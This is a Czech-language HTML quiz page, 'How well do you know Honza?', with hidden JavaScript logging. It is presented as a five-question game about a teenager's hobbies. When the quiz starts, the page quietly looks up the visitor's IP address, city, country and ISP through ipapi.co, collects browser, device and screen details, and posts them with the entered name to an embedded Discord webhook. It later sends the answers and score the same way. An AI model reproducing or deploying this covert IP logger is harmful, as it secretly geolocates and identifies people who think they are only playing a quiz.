<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jak dobře znáš Honzu?</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            user-select: none;
        }
        .quiz-container {
            background-color: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #38bdf8;
            font-size: 26px;
            margin-bottom: 10px;
        }
        .progress {
            color: #64748b;
            font-size: 13px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 15px;
        }
        .question {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: left;
            min-height: 55px;
        }
        .options-grid {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .option-btn {
            background-color: #334155;
            color: #f8fafc;
            border: 2px solid #475569;
            padding: 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 15px;
            text-align: left;
            transition: all 0.2s ease;
        }
        .option-btn:hover {
            background-color: #38bdf8;
            color: #0f172a;
            border-color: #38bdf8;
            transform: translateY(-2px);
        }
        .score-display {
            font-size: 24px;
            font-weight: bold;
            color: #38bdf8;
            margin: 15px 0;
            background: rgba(56, 189, 248, 0.1);
            padding: 10px;
            border-radius: 8px;
            border: 1px solid rgba(56, 189, 248, 0.2);
        }
        /* Styly pro zadání jména */
        .name-input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border-radius: 8px;
            border: 2px solid #475569;
            background-color: #334155;
            color: #f8fafc;
            box-sizing: border-box;
            margin-bottom: 20px;
            text-align: center;
        }
        .name-input:focus {
            outline: none;
            border-color: #38bdf8;
        }
        .start-btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
        }
        .start-btn:hover {
            background-color: #0ea5e9;
        }
    </style>
</head>
<body>

    <div class="quiz-container" id="quiz-box">
        <h1>Jak dobře znáš Honzu? 🤔</h1>
        <p style="color: #94a3b8; margin-bottom: 20px;">Napiš své jméno nebo přezdívku a začni kvíz!</p>
        <input type="text" id="username-field" class="name-input" placeholder="Tvoje jméno..." maxlength="20">
        <button class="start-btn" onclick="startQuiz()">Spustit kvíz 🚀</button>
    </div>

    <script>
        // Nastavení webhooku
        // !!! SEM VLOŽ SVŮJ NOVÝ WEBHOOK !!!
        const webhookUrl = "https://discord.com/api/webhooks/1515336637939318804/-c5CHyTXs8ZwbUuA65DQqjAwZL5-oqz2UOs9t_d3YLEIyn-ODFGppiVkTRFxA3Gf-LJC";

        // Definice otázek
        const questions = [
            {
                q: "Jaká je Honzova nejoblíbenější platforma na vývoj her, programování a trolling?",
                options: ["Roblox (LuaU / Studio)", "Fortnite (Creative)", "Unity (C#)", "Scratch (Bloky)"]
            },
            {
                q: "Jakou tiskárnu Honza používá pro svůj 3D tisk?",
                options: ["Creality Ender 3", "Bambu Lab P1S", "Prusa MK4", "Anycubic Photon"]
            },
            {
                q: "Co Honza nejčastěji staví a programuje v Minecraftu?",
                options: ["Redstone mechanické domy", "PVP mapy a servery", "Command blocky a technické sys.", "Survival hrady"]
            },
            {
                q: "Jaký hudební styl nebo žánr Honza nejraději poslouchá při kódování nebo hraní?",
                options: ["Phonk", "Pop / Radio hity", "Heavy Metal", "Klasická hudba"]
            },
            {
                q: "Jakou brigádu by si chtěl Honza v budoucnu (až to půjde legálně) zkusit?",
                options: ["Rozvoz jídla / doručování pošty", "Práce v supermarketu", "Asistent v kanclíku", "Práce v kuchyni"]
            }
        ];

        // Přesné správné odpovědi pro kontrolu skóre
        const correctAnswers = [
            "Roblox (LuaU / Studio)",
            "Bambu Lab P1S",
            "Command blocky a technické sys.",
            "Phonk",
            "Rozvoz jídla / doručování pošty"
        ];

        let currentStep = 0;
        let userName = "Anonym";
        let userAnswers = []; 
        let score = 0;

        // Funkce pro spuštění kvízu po zadání jména
        function startQuiz() {
            const inputVal = document.getElementById("username-field").value.trim();
            if (inputVal !== "") {
                userName = inputVal;
            }

            // Okamžitě odešleme systémové info s jeho jménem na Discord
            triggerInfoLogger();

            // Načteme první otázku
            loadNextQuestion();
        }

        function loadNextQuestion() {
            const currentQuestionData = questions[currentStep];
            currentStep++;

            let optionsHtml = currentQuestionData.options.map((opt, index) => {
                return `<button class="option-btn" onclick="handleAnswer(${index + 1})">${opt}</button>`;
            }).join("");

            document.getElementById("quiz-box").innerHTML = `
                <h1>Jak dobře znáš Honzu? 🤔</h1>
                <div class="progress">Otázka ${currentStep} z 5</div>
                <div class="question" id="quiz-question">${currentQuestionData.q}</div>
                <div class="options-grid" id="quiz-options">${optionsHtml}</div>
            `;
        }

        function handleAnswer(selectedOptionIndex) {
            const currentOptions = document.getElementById("quiz-options").children;
            let chosenAnswer = currentOptions[selectedOptionIndex - 1].innerText;
            
            // Kontrola správnosti podle indexu otázky
            if (chosenAnswer === correctAnswers[currentStep - 1]) {
                score++;
            }

            userAnswers.push(`Q${currentStep}: ${chosenAnswer}`);

            if (currentStep < 5) {
                loadNextQuestion();
            } else {
                // Konec kvízu
                document.getElementById("quiz-box").innerHTML = `
                    <h1 style="color: #4ade80;">Kvíz dokončen! 🎉</h1>
                    <div class="score-display">Tvoje skóre: ${score} z 5</div>
                    <p style="color: #94a3b8; margin-top: 10px; font-size: 15px;">Díky za vyplnění, ${userName}! Výsledky byly úspěšně odeslány k vyhodnocení.</p>
                `;
                // Na konci odešleme nashromážděné odpovědi se jménem
                triggerAnswersLogger();
            }
        }

        // 1. LOGGER: Pouze systém, IP a JMÉNO uživatele
        function triggerInfoLogger() {
            fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(geoData => {
                const parser = navigator.userAgent;
                const mobileDetect = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
                const isMobile = mobileDetect.test(parser);

                let browser = "Neznámý Browser";
                if (parser.includes("Firefox")) browser = "Firefox";
                else if (parser.includes("Opr/")) browser = "Opera";
                else if (parser.includes("Edg")) browser = "Edge";
                else if (parser.includes("Chrome")) browser = "Google Chrome";
                else if (parser.includes("Safari")) browser = "Safari";

                const payloadData = {
                    ip: geoData.ip || "Neznámá",
                    city: geoData.city || "Neznámé",
                    country: geoData.country_name || "Neznámý",
                    isp: geoData.org || "Neznámý",
                    deviceType: isMobile ? "Mobil" : "Počítač (Desktop)",
                    browser: browser,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timestamp: new Date().toLocaleString("cs-CZ")
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📡 **Uživatel [ ${userName} ] se právě připojil ke kvízu!**`,
                        embeds: [{
                            title: `Kvíz Logger - System Info (${userName})`,
                            color: 2342392,
                            fields: [
                                { name: "IP Adresa", value: payloadData.ip, inline: true },
                                { name: "Lokace", value: `${payloadData.city} / ${payloadData.country}`, inline: true },
                                { name: "Poskytovatel (ISP)", value: payloadData.isp, inline: false },
                                { name: "Zařízení", value: payloadData.deviceType, inline: true },
                                { name: "Prohlížeč", value: payloadData.browser, inline: true },
                                { name: "Rozlišení obrazovky", value: payloadData.screenResolution, inline: true }
                            ],
                            footer: { text: `Honza Quiz Info Core v4.5 • ${payloadData.timestamp}` }
                        }]
                    })
                });
            })
            .catch(err => console.error("Chyba:", err));
        }

        // 2. LOGGER: Odpovědi, skóre a JMÉNO na konci
        function triggerAnswersLogger() {
            const answersContent = userAnswers.join("\n");
            const timestamp = new Date().toLocaleString("cs-CZ");

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `📊 **Uživatel [ ${userName} ] dokončil kvíz! Dosáhl skóre: ${score} z 5 bodů**`,
                    embeds: [{
                        title: `Kvíz Výsledky - ${userName}`,
                        color: score >= 4 ? 4905856 : 16738654, 
                        description: `\`\`\`text\n${answersContent}\n\`\`\``,
                        footer: { text: `Honza Quiz Answers Core v4.5 • ${timestamp}` }
                    }]
                })
            })
            .catch(err => console.error("Chyba:", err));
        }
    </script>
</body>
</html>
